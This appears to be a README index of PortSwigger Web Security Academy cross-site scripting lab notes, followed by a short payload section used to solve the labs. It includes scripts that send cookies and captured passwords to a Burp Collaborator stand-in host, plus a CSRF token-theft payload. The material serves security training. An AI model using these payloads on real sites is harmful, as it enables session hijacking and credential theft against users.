# [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

## Lab

- Reflected XSS:
  - apprentice:
    - [1. Reflected XSS into HTML context with nothing encoded](./lab/1.%20Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded.md)
    - [7. Reflected XSS into attribute with angle brackets HTML-encoded](./lab/7.%20Reflected%20XSS%20into%20attribute%20with%20angle%20brackets%20HTML-encoded.md)
    - [9. Reflected XSS into a JavaScript string with angle brackets HTML encoded](./lab/9.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20HTML%20encoded.md)
  - practitioner:
    - [17. Reflected XSS into HTML context with most tags and attributes blocked](./lab/17.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked.md)
    - [18. Reflected XSS into HTML context with all tags blocked except custom ones](./lab/18.%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones.md)
    - [19. Reflected XSS with some SVG markup allowed](./lab/19.%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed.md)
    - [20. Reflected XSS in canonical link tag](./lab/20.%20Reflected%20XSS%20in%20canonical%20link%20tag.md)
    - [21. Reflected XSS into a JavaScript string with single quote and backslash escaped](./lab/21.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped.md)
    - [22. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](./lab/22.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped.md)
    - [24. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](./lab/24.%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets%2C%20single%2C%20double%20quotes%2C%20backslash%20and%20backticks%20Unicode-escaped.md)
- Stored XSS:
  - apprentice:
    - [2. Stored XSS into HTML context with nothing encoded](./lab/2.%20Stored%20XSS%20into%20HTML%20context%20with%20nothing%20encoded.md)
    - [8. Stored XSS into anchor href attribute with double quotes HTML-encoded](./lab/8.%20Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded.md)
  - practitioner:
    - [23. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](./lab/23.%20Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped.md)

- DOM-based XSS:
  - apprentice:
    - [3. DOM XSS in document.write sink using source location.search](./lab/3.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search.md)
    - [4. DOM XSS in innerHTML sink using source location.search](./lab/4.%20DOM%20XSS%20in%20innerHTML%20sink%20using%20source%20location.search.md)
    - [5. DOM XSS in jQuery anchor href attribute sink using location.search source](./lab/5.%20DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source.md)
    - [6. DOM XSS in jQuery selector sink using a hashchange event](./lab/6.%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event.md)
  - practitioner:
    - [10. DOM XSS in document.write sink using source location.search inside a select element](./lab/10.%20DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element.md)
    - [11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](./lab/11.%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded.md)
- practitioner:
  - [12. Reflected DOM XSS](./lab/12.%20Reflected%20DOM%20XSS.md)
  - [13. Stored DOM XSS](./lab/13.%20Stored%20DOM%20XSS.md)
  - [14. Exploiting cross-site scripting to steal cookies](./lab/14.%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies.md)
  - [15. Exploiting cross-site scripting to capture passwords](./lab/15.%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords.md)
  - [16. Exploiting XSS to perform CSRF](./lab/16.%20Exploiting%20XSS%20to%20perform%20CSRF.md)

## payloads

auto resize:

 ```html
<iframe src="https://id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=1>
```

script to steal cookies:

```js
<script>
fetch('https://collaborator', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

script to capture password:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

script to csrf:

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## References

cheatsheet: <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
